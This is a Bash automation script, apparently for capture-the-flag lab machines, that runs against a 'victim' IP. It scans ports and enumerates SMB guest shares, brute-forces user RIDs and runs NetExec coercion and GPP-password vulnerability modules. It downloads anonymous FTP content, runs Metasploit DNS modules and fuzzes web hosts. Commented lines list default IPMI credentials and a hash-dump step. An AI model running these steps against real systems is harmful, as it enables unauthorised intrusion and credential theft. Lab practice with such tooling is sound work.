#!/bin/bash

BLUE='\033[0;34m'
GREEN='\033[0;32m' 
YELLOW='\033[1;33m' 
RED='\033[0;31m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
GRAY='\033[0;37m'
LIGHT_BLUE='\033[1;34m'
LIGHT_GREEN='\033[1;32m'
LIGHT_YELLOW='\033[1;33m'
LIGHT_RED='\033[1;31m'
LIGHT_CYAN='\033[1;36m'
LIGHT_PURPLE='\033[1;35m'
WHITE='\033[1;37m'
NC='\033[0m' # No color

#Default variables
ldaps_bool=false    # 389 3268 and ldpas 636 and 3269

#Programs to variable
netexec=$(which netexec)
smbmap=$(which smbmap)
pre2k=$(which pre2k) #in test
coercer=$(which coercer)
rdwatool=$(which rdwatool) #search for image png to validate cool
nmap=$(which nmap)
john=$(which john)

ipvictima=$1
nombre=$2

# Function to validate if a string is an IP address
is_valid_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        return 0
    else
        return 1
    fi
}

# Function to handle the interrupt signal (CTRL+C)
handle_interrupt() {
    echo
    read -p "Are you sure you want to exit? (y/n): " confirm
    if [ "$confirm" == "y" ]; then
        exit 0
    fi
}

# Assign the interrupt signal handling function to the SIGINT signal (CTRL+C)
trap handle_interrupt SIGINT

figlet The Player
echo "             Version:0.5.1  Surgat"

if [ -z "$ipvictima" ] || [ -z "$nombre" ]; then
    echo "Usage: theplayer <IP> <NAME OF MACHINE>"
    echo "Example: theplayer 10.10.10.129 easymachine"
    exit 1
fi

if ! is_valid_ip $ipvictima; then
    echo "Invalid IP address. The first argument should be a valid IP address."
    exit 1
fi

if ! [[ $nombre =~ ^[[:alpha:]]+$ ]]; then
    echo "Invalid name. The second argument should be a word."
    exit 1
fi

echo -e "${LIGHT_BLUE}[+]       Pinging victim IP... ${NC}"
while ! is_valid_ip $ipvictima || ! ping -c 1 $ipvictima >/dev/null; do
    echo "Ping unsuccessful. Retrying in 1 second..."
    sleep 1
done

## Fast Scan and scan al open ports

echo -e "${LIGHT_BLUE}[+]       Fast Scan... \n ${NC}"
sudo nmap -T4 -F $ipvictima
echo -e "${LIGHT_YELLOW}\n[info]             if 80/443 port... Time to Open Firefox and Burpsuite Manually\n${NC}"
echo -e "${LIGHT_BLUE}[info]                 Please wait, already listing all ports... \n ${NC}"
ports=$(nmap -p- -n -Pn --min-rate=3000 $ipvictima | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
echo -e "${LIGHT_BLUE}[+]         Ports open: ${NC}"
echo -e "${LIGHT_BLUE}\n[+]         $ports ${NC}"

echo -e "${LIGHT_BLUE}\n[info]                     launch in background NMAP -sV -sC -Pn \n${NC}"
nmap -p$ports -sV -sC -Pn $ipvictima -oX ResultNmap$nombre &

echo -e "${LIGHT_BLUE}[info]                       working in open ports...  ${NC}"

    # Verify ports 80 is open http
    # todo in full scan filter for open ssl/http para https y open http para http
    
if echo "$ports" | grep -q "\<80\>" ; then
    echo -e "${YELLOW}[+] Find 80 port open in IP $ipvictima${NC}"
    echo -e "${LIGHT_GREEN}\n[info] You should run nikto in other terminal${NC}"
    echo -e "${LIGHT_GREEN}[info] nikto -h http://$ipvictima -C all${NC}"
    echo "-----------------------"
    echo -e "${LIGHT_CYAN}[+]          Verbose Curl to IP $ipvictima${NC}"
    echo "-----------------------"
    echo -e "${YELLOW}"
    curl -vvv $ipvictima
    echo -e "${NC}"
fi
    # Verify port 443 is open https
    
if echo "$ports" | grep -q "\<443\>"; then
    echo -e "${YELLOW}\n[+] Find 443 port open in IP $ipvictima Check https cert for subdomains \n${NC}"
    echo -e "${GREEN}                  You should run nikto in other terminal${NC}"
    echo -e "${GREEN}                  nikto -h https://$ipvictima -C all${NC}"
    echo ""
    echo "-----------------------"
    echo -e "${LIGHT_CYAN}[+]          Verbose Curl to IP $ipvictima${NC}"
    echo "-----------------------"
    echo -e "${LIGHT_CYAN}"
    curl -k -vvv https://$ipvictima
    echo -e "${NC}"
fi

# ldap and search for aspreproast temporaly disabled 

# if echo "$ports" | grep -q "389\|3268\|636\|3269"; then
#    echo "-----------------------"
#    echo -e "${GREEN}\n[+] Find 389 o 3268 open, en IP $ipvictima${NC}"
#    echo "-----------------------/n"
#    echo -e "${YELLOW}[-] Runing search for asreproast:${NC}"
#    nxc ldap $ipvictima -u 'guest' -p '' --asreproast output.txt
#    echo -e "${GREEN}\n    if is vulnerable for aspreproast use  hashcat -m18200 output.txt wordlist ${NC}"
#    echo "-----------------------/n"
#fi
    # Verify ports 139 o 445 are open smb
    
if echo "$ports" | grep -q "139\|445"; then
    echo -e "${GREEN}\n[+] Find 139 o 445 open, en IP $ipvictima\n${NC}"
    echo -e "${YELLOW}[-] Runing enumeration SMB, LDAP, RPC, without Credentials using enum4linux-ng:\n${NC}"
    enum4linux-ng -Adv -oA enum4linuxreultado $ipvictima
#    echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials, ntbscan:${NC}"
#    nbtscan $ipvictima
#   echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials 1/3 ${NC}"
#   smbmap -H $ipvictima
#   echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials 2/3 ${NC}"
#   smbmap -H $ipvictima -u null -p null
#   echo -e "${YELLOW}[-] Runing enumeration SMB withowt Credentials 3/3 ${NC}"
#   smbmap -H $ipvictima -u guest
    echo "-----------------------"
    echo -e "${YELLOW}[-] smbclient:${NC}"
    smbclient -N -L //$ipvictima
#   crackmapexec smb $ipvictima
#    echo -e "${YELLOW}[-] SMB and password policy with crackmapexec blank user and password:${NC}"
#    crackmapexec smb $ipvictima --pass-pol -u "" -p ""
#    echo -e "${YELLOW}[-] SMB and password policy with crackmapexec user guest:${NC}"
#    crackmapexec smb $ipvictima --pass-pol -u guest
#    echo -e "-----------------------\n"
#    echo -e "${YELLOW}[-] Testing NetExec first only for shares:${NC}"
#    nxc smb $ipvictima -u 'guest' -p '' --shares
    echo -e "-----------------------\n"
    echo -e "${YELLOW}[-] NetExec shares FILTER ONLY READ WRITE:${NC}"
    nxc smb $ipvictima -u 'guest' -p '' --shares --filter-shares READ WRITE
    echo -e "-----------------------\n"
    echo -e "${YELLOW}[-]    NetExec bruteforce users:${NC}"
    nxc smb $ipvictima -u 'guest' -p '' --rid-brute 10000
    echo -e "-----------------------\n"
    echo -e "${YELLOW}[-] Testing NetExec MODULES OF VULNS:${NC}"
    nxc smb $ipvictima -u 'guest' -p '' -M enum_av -M shadowcoerce -M petitpotam -M dfscoerce -M gpp_autologin -M gpp_password
fi
echo -e "${GREEN}\n      [-] Waiting to finish complete Nmap in background...${NC}"

wait

## Host name to /etc/hosts
echo "-----------------------"
echo -e "${YELLOW}\n[+] Searching for hostnames in Nmap output...${NC}"
echo "-----------------------"
# Searching hostnames in Nmap output
urls=$(xmllint --xpath '//host/ports/port/script[@id="http-title" and @output!=""]/@output' ResultNmap$nombre | sed -n -E 's/.*(https?|http):\/\/([^/]+).*/\2/p')

for hostname in $urls; do
    if ! grep -q "$hostname" /etc/hosts; then
        echo ""
        echo -e "${GREEN}       Adding ${YELLOW} $hostname ${GREEN}to /etc/hosts ${NC}"
        echo "$ipvictima $(dig +short "$hostname")$hostname # added by theplayer.sh" | sudo tee -a /etc/hosts >/dev/null
    else
        echo ""
        echo -e "${GREEN}        Skipping${YELLOW} $hostname ${GREEN}because it already exists in /etc/hosts${NC}"
    fi
done

if [ -z "$urls" ]; then
    echo -e "${LIGHT_CYAN}\n[-]       No hostnames found in the results of Nmap.${NC}"
else
    echo ""
    echo -e "${YELLOW}\n[+]       Hostnames found:${NC}"
    echo "$urls"
fi

## Curl on screen, ffuf subdomanin and wfuzz virtualhosts

    for host in $urls; do
        echo ""
        echo -e "${LIGHT_CYAN}[+]       Curl to $hostname${NC}"
        curl -vvv $hostname
        echo ""
        echo -e "${LIGHT_CYAN}[+]       Directory and archive fuzz (wfuzz combined_words) $hostname${NC}"
        echo ""
        wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt --hc 404,302,400 -u "$hostname/FUZZ"
        echo ""
        echo -e "${LIGHT_CYAN}[+]       Subdomain Virtualhosts fuzz (ffuf combined_subdomains) $hostname ${NC}"
        echo "" # ffuf with autocalibrate
        ffuf -u http://$hostname -H "Host:FUZZ.$hostname" -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -mc all -c -v -ac true -o fuff$hostname
    done

foldername="ftp$nombre"
# Find the <port> tag with the attribute portid="21" and state="open"
port_info=$(xmllint --xpath '//port[@portid="21" and state/@state="open"]' ResultNmap$nombre)

# Check if the <port> tag was found.
if [[ -n $port_info ]]; then
  # Search if anonymous login is allowed in the <script> tag with id="ftp-anon"
  anon_login=$(echo "$port_info" | grep -o 'Anonymous FTP login allowed')

  if [[ -n $anon_login ]]; then
    echo -e "${GREEN}Port 21 is open and anonymous login is allowed.${NC}"
    echo -e "${LIGHT_BLUE}      Downloading FTP content...${NC}"

    # FTP content download
    wget --user=anonymous --password=anonymous -r "ftp://$ipvictima" -P "$foldername"
    echo -e "${GREEN}FTP content downloaded to $foldername${NC}"
  else
    echo -e "${BLUE}[-] Port 21 is open but anonymous login is not allowed.${NC}"
  fi
else
  echo -e "${BLUE}[-] Port 21 is not open.${NC}"
fi
echo " "
echo " "

## DNS server
# Find the <port> tag with the attribute portid="21" and state="open"
port_info53=$(xmllint --xpath '//port[@portid="53" and state/@state="open"]' ResultNmap$nombre)
# Check if the <port> tag was found.
echo -e "${LIGHT_BLUE}\n[-] Port 53 DNS is open, try to grab the banner and run metasploit modules dns_amp and enum_dns\n${NC}"
if [[ -n $port_info53 ]]; then
  # launch domain dns search and dig banner grab
   dig version.bind CHAOS TXT @$1
   msfconsole -q -x "use auxiliary/scanner/dns/dns_amp; set RHOSTS $ipvictima; set RPORT 53; run; exit" && msfconsole -q -x "use auxiliary/gather/enum_dns; set RHOSTS $ipvictima; set RPORT 53; run; exit"
else
  echo -e "${BLUE}[-] port 53 DNS is not open.${NC}"
fi
echo " "
echo " "

# Puerto 623 IPMI 2  ilo, idrac etc...
# echo -e "${BLUE}[-] Port 623 try, IDRAC root:calvin  Supermicro ADMIN:ADMIN IBM IMM USERID:PASSW0RD Fujitsu admin:admin Oracle/Sun root:changeme ASUS iKVM BNC admin:admin.${NC}"
# echo -e "${BLUE}[-] Trying to dump hash...${NC}"
# msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS $ipvictima; run; exit" && msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes set RHOSTS $ipvictima; run; exit"
#


# echo -e "${YELLOW}[+] Searching exploitdb...${NC}"
# searchsploit --nmap ResultNmap$nombre --id
# echo " "
# Buscar alternativas
# echo -e "${YELLOW}[+] Search Vulns with NMAP...${NC}"
# nmap -sV -Pn -n -A --script vuln $ipvictima
